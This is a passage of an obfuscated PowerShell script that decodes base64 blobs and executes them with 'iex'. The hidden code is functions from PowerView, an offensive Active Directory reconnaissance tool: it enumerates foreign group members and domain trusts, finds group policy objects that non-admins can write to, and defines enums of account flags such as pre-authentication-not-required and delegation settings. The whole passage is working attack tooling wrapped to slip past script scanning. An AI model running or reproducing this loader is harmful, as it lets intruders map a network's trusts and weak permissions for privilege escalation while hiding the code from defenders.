VOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKG1lbWJlcj0qKScKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRSYXcgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgJEV4Y2x1ZGVHcm91cHMgPSBAKCdVc2VycycsICdEb21haW4gVXNlcnMnLCAnR3Vlc3RzJykKICAgICAgICBHZXQtRG9tYWluR3JvdXAgQFNlYXJjaGVyQXJndW1lbnRzIHwgV2hlcmUtT2JqZWN0IHsgJEV4Y2x1ZGVHcm91cHMgLW5vdGNvbnRhaW5zICRfLnNhbWFjY291bnRuYW1lIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRHcm91cE5hbWUgPSAkXy5zYW1BY2NvdW50TmFtZQogICAgICAgICAgICAkR3JvdXBEaXN0aW5ndWlzaGVkTmFtZSA9ICRfLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICRHcm91cERvbWFpbiA9ICRHcm91cERpc3Rpbmd1aXNoZWROYW1lLlN1YlN0cmluZygkR3JvdXBEaXN0aW5ndWlzaGVkTmFtZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAkXy5tZW1iZXIgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJF8uU3ViU3RyaW5nKCRfLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICBpZiAoKCRfIC1tYXRjaCAnQ049Uy0xLTUtMjEuKi0uKicpIC1vciAoJEdyb3VwRG9tYWluIC1uZSAkTWVtYmVyRG9tYWluKSkgewogICAgICAgICAgICAgICAgICAgICRNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZSA9ICRfCiAgICAgICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSAkXy5TcGxpdCgnLCcpWzBdLnNwbGl0KCc9JylbMV0KICAgICAgICAgICAgICAgICAgICAkRm9yZWlnbkdyb3VwTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEb21haW4nICRHcm91cERvbWFpbgogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERpc3Rpbmd1aXNoZWROYW1lJyAkR3JvdXBEaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRG9tYWluJyAkTWVtYmVyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkTWVtYmVyTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnICRNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICRGb3JlaWduR3JvdXBNZW1iZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkZvcmVpZ25Hcm91cE1lbWJlcicpCiAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Hcm91cE1lbWJlcgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblRydXN0TWFwcGluZyB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5UcnVzdC5ORVQnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRG9tYWluVHJ1c3QuTERBUCcpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5UcnVzdC5BUEknKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdBUEknKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRBUEksCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ05FVCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5FVCwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnQVBJJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgJFNlZW5Eb21haW5zID0gQHt9CiAgICAkRG9tYWlucyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlN0YWNrCiAgICAkRG9tYWluVHJ1c3RBcmd1bWVudHMgPSBAe30KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0FQSSddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snQVBJJ10gPSAkQVBJIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ05FVCddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snTkVUJ10gPSAkTkVUIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJERvbWFpblRydXN0QXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICREb21haW5UcnVzdEFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICRDdXJyZW50RG9tYWluID0gKEdldC1Eb21haW4gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwpLk5hbWUKICAgIH0KICAgIGVsc2UgewogICAgICAgICRDdXJyZW50RG9tYWluID0gKEdldC1Eb21haW4pLk5hbWUKICAgIH0KICAgICREb21haW5zLlB1c2goJEN1cnJlbnREb21haW4pCiAgICB3aGlsZSgkRG9tYWlucy5Db3VudCAtbmUgMCkgewogICAgICAgICREb21haW4gPSAkRG9tYWlucy5Qb3AoKQogICAgICAgIGlmICgkRG9tYWluIC1hbmQgKCREb21haW4uVHJpbSgpIC1uZSAnJykgLWFuZCAoLW5vdCAkU2VlbkRvbWFpbnMuQ29udGFpbnNLZXkoJERvbWFpbikpKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RNYXBwaW5nXSBFbnVtZXJhdGluZyB0cnVzdHMgZm9yIGRvbWFpbjogJyREb21haW4nIgogICAgICAgICAgICAkTnVsbCA9ICRTZWVuRG9tYWlucy5BZGQoJERvbWFpbiwgJycpCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3RBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgICAgICAgICAgJFRydXN0cyA9IEdldC1Eb21haW5UcnVzdCBARG9tYWluVHJ1c3RBcmd1bWVudHMKICAgICAgICAgICAgICAgIGlmICgkVHJ1c3RzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgewogICAgICAgICAgICAgICAgICAgICRUcnVzdHMgPSBAKCRUcnVzdHMpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdORVQnKSB7CiAgICAgICAgICAgICAgICAgICAgJEZvcmVzdFRydXN0QXJndW1lbnRzID0gQHt9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsgJEZvcmVzdFRydXN0QXJndW1lbnRzWydGb3Jlc3QnXSA9ICRGb3Jlc3QgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRm9yZXN0VHJ1c3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgICAgICAkVHJ1c3RzICs9IEdldC1Gb3Jlc3RUcnVzdCBARm9yZXN0VHJ1c3RBcmd1bWVudHMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkVHJ1c3RzKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRUcnVzdHMgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUcnVzdHMgPSBAKCRUcnVzdHMpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRUcnVzdCBpbiAkVHJ1c3RzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkVHJ1c3QuU291cmNlTmFtZSAtYW5kICRUcnVzdC5UYXJnZXROYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICREb21haW5zLlB1c2goJFRydXN0LlRhcmdldE5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVHJ1c3QKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblRydXN0TWFwcGluZ10gRXJyb3I6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdQT0RlbGVnYXRpb24gewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbU3RyaW5nXQogICAgICAgICRHUE9OYW1lID0gJyonLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgJEV4Y2x1c2lvbnMgPSBAKCdTWVNURU0nLCdEb21haW4gQWRtaW5zJywnRW50ZXJwcmlzZSBBZG1pbnMnKQogICAgJEZvcmVzdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEN1cnJlbnRGb3Jlc3QoKQogICAgJERvbWFpbkxpc3QgPSBAKCRGb3Jlc3QuRG9tYWlucykKICAgICREb21haW5zID0gJERvbWFpbkxpc3QgfCBmb3JlYWNoIHsgJF8uR2V0RGlyZWN0b3J5RW50cnkoKSB9CiAgICBmb3JlYWNoICgkRG9tYWluIGluICREb21haW5zKSB7CiAgICAgICAgJEZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1ncm91cFBvbGljeUNvbnRhaW5lcikoZGlzcGxheW5hbWU9JEdQT05hbWUpKSIKICAgICAgICAkU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcgogICAgICAgICRTZWFyY2hlci5TZWFyY2hSb290ID0gJERvbWFpbgogICAgICAgICRTZWFyY2hlci5GaWx0ZXIgPSAkRmlsdGVyCiAgICAgICAgJFNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJFNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiCiAgICAgICAgJGxpc3RHUE8gPSAkU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgZm9yZWFjaCAoJGdwbyBpbiAkbGlzdEdQTyl7CiAgICAgICAgICAgICRBQ0wgPSAoW0FEU0ldJGdwby5wYXRoKS5PYmplY3RTZWN1cml0eS5BY2Nlc3MgfCA/IHskXy5BY3RpdmVEaXJlY3RvcnlSaWdodHMgLW1hdGNoICJXcml0ZSIgLWFuZCAkXy5BY2Nlc3NDb250cm9sVHlwZSAtZXEgIkFsbG93IiAtYW5kICAkRXhjbHVzaW9ucyAtbm90Y29udGFpbnMgJF8uSWRlbnRpdHlSZWZlcmVuY2UudG9TdHJpbmcoKS5zcGxpdCgiXCIpWzFdIC1hbmQgJF8uSWRlbnRpdHlSZWZlcmVuY2UgLW5lICJDUkVBVE9SIE9XTkVSIn0KICAgICAgICBpZiAoJEFDTCAtbmUgJG51bGwpewogICAgICAgICAgICAkR3BvQUNMID0gTmV3LU9iamVjdCBwc29iamVjdAogICAgICAgICAgICAkR3BvQUNMIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0FEU1BhdGgnICRncG8uUHJvcGVydGllcy5hZHNwYXRoCiAgICAgICAgICAgICRHcG9BQ0wgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPRGlzcGxheU5hbWUnICRncG8uUHJvcGVydGllcy5kaXNwbGF5bmFtZQogICAgICAgICAgICAkR3BvQUNMIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlJyAkQUNMLklkZW50aXR5UmVmZXJlbmNlCiAgICAgICAgICAgICRHcG9BQ0wgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQWN0aXZlRGlyZWN0b3J5UmlnaHRzJyAkQUNMLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cwogICAgICAgICAgICAkR3BvQUNMCiAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE1vZCA9IE5ldy1Jbk1lbW9yeU1vZHVsZSAtTW9kdWxlTmFtZSBXaW4zMgokU2FtQWNjb3VudFR5cGVFbnVtID0gcHNlbnVtICRNb2QgUG93ZXJWaWV3LlNhbUFjY291bnRUeXBlRW51bSBVSW50MzIgQHsKICAgIERPTUFJTl9PQkpFQ1QgICAgICAgICAgICAgICAgICAgPSAgICcweDAwMDAwMDAwJwogICAgR1JPVVBfT0JKRUNUICAgICAgICAgICAgICAgICAgICA9ICAgJzB4MTAwMDAwMDAnCiAgICBOT05fU0VDVVJJVFlfR1JPVVBfT0JKRUNUICAgICAgID0gICAnMHgxMDAwMDAwMScKICAgIEFMSUFTX09CSkVDVCAgICAgICAgICAgICAgICAgICAgPSAgICcweDIwMDAwMDAwJwogICAgTk9OX1NFQ1VSSVRZX0FMSUFTX09CSkVDVCAgICAgICA9ICAgJzB4MjAwMDAwMDEnCiAgICBVU0VSX09CSkVDVCAgICAgICAgICAgICAgICAgICAgID0gICAnMHgzMDAwMDAwMCcKICAgIE1BQ0hJTkVfQUNDT1VOVCAgICAgICAgICAgICAgICAgPSAgICcweDMwMDAwMDAxJwogICAgVFJVU1RfQUNDT1VOVCAgICAgICAgICAgICAgICAgICA9ICAgJzB4MzAwMDAwMDInCiAgICBBUFBfQkFTSUNfR1JPVVAgICAgICAgICAgICAgICAgID0gICAnMHg0MDAwMDAwMCcKICAgIEFQUF9RVUVSWV9HUk9VUCAgICAgICAgICAgICAgICAgPSAgICcweDQwMDAwMDAxJwogICAgQUNDT1VOVF9UWVBFX01BWCAgICAgICAgICAgICAgICA9ICAgJzB4N2ZmZmZmZmYnCn0KJEdyb3VwVHlwZUVudW0gPSBwc2VudW0gJE1vZCBQb3dlclZpZXcuR3JvdXBUeXBlRW51bSBVSW50MzIgQHsKICAgIENSRUFURURfQllfU1lTVEVNICAgICAgICAgICAgICAgPSAgICcweDAwMDAwMDAxJwogICAgR0xPQkFMX1NDT1BFICAgICAgICAgICAgICAgICAgICA9ICAgJzB4MDAwMDAwMDInCiAgICBET01BSU5fTE9DQUxfU0NPUEUgICAgICAgICAgICAgID0gICAnMHgwMDAwMDAwNCcKICAgIFVOSVZFUlNBTF9TQ09QRSAgICAgICAgICAgICAgICAgPSAgICcweDAwMDAwMDA4JwogICAgQVBQX0JBU0lDICAgICAgICAgICAgICAgICAgICAgICA9ICAgJzB4MDAwMDAwMTAnCiAgICBBUFBfUVVFUlkgICAgICAgICAgICAgICAgICAgICAgID0gICAnMHgwMDAwMDAyMCcKICAgIFNFQ1VSSVRZICAgICAgICAgICAgICAgICAgICAgICAgPSAgICcweDgwMDAwMDAwJwp9IC1CaXRmaWVsZAokVUFDRW51bSA9IHBzZW51bSAkTW9kIFBvd2VyVmlldy5VQUNFbnVtIFVJbnQzMiBAewogICAgU0NSSVBUICAgICAgICAgICAgICAgICAgICAgICAgICA9ICAgMQogICAgQUNDT1VOVERJU0FCTEUgICAgICAgICAgICAgICAgICA9ICAgMgogICAgSE9NRURJUl9SRVFVSVJFRCAgICAgICAgICAgICAgICA9ICAgOAogICAgTE9DS09VVCAgICAgICAgICAgICAgICAgICAgICAgICA9ICAgMTYKICAgIFBBU1NXRF9OT1RSRVFEICAgICAgICAgICAgICAgICAgPSAgIDMyCiAgICBQQVNTV0RfQ0FOVF9DSEFOR0UgICAgICAgICAgICAgID0gICA2NAogICAgRU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQgICAgICA9ICAgMTI4CiAgICBURU1QX0RVUExJQ0FURV9BQ0NPVU5UICAgICAgICAgID0gICAyNTYKICAgIE5PUk1BTF9BQ0NPVU5UICAgICAgICAgICAgICAgICAgPSAgIDUxMgogICAgSU5URVJET01BSU5fVFJVU1RfQUNDT1VOVCAgICAgICA9ICAgMjA0OAogICAgV09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVCAgICAgICA9ICAgNDA5NgogICAgU0VSVkVSX1RSVVNUX0FDQ09VTlQgICAgICAgICAgICA9ICAgODE5MgogICAgRE9OVF9FWFBJUkVfUEFTU1dPUkQgICAgICAgICAgICA9ICAgNjU1MzYKICAgIE1OU19MT0dPTl9BQ0NPVU5UICAgICAgICAgICAgICAgPSAgIDEzMTA3MgogICAgU01BUlRDQVJEX1JFUVVJUkVEICAgICAgICAgICAgICA9ICAgMjYyMTQ0CiAgICBUUlVTVEVEX0ZPUl9ERUxFR0FUSU9OICAgICAgICAgID0gICA1MjQyODgKICAgIE5PVF9ERUxFR0FURUQgICAgICAgICAgICAgICAgICAgPSAgIDEwNDg1NzYKICAgIFVTRV9ERVNfS0VZX09OTFkgICAgICAgICAgICAgICAgPSAgIDIwOTcxNTIKICAgIERPTlRfUkVRX1BSRUFVVEggICAgICAgICAgICAgICAgPSAgIDQxOTQzMDQKICAgIFBBU1NXT1JEX0VYUElSRUQgICAgICAgICAgICAgICAgPSAgIDgzODg2MDgKICAgIFRSVVNURURfVE9fQVVUSF9GT1JfREVMRUdBVElPTiAgPSAgIDE2Nzc3MjE2CiAgICBQQVJUSUFMX1NFQ1JFVFNfQUNDT1VOVCAgICAgICAgID0gICA2NzEwODg2NAp9IC1CaXRmaWVsZAokV1RTQ29ubmVjdFN0YXRlID0gcHNlbnVtICRNb2QgV1RTX0NPTk5FQ1RTVEFURV9DTEFTUyBVSW50MTYgQHsKICAgIEFjdGl2ZSAgI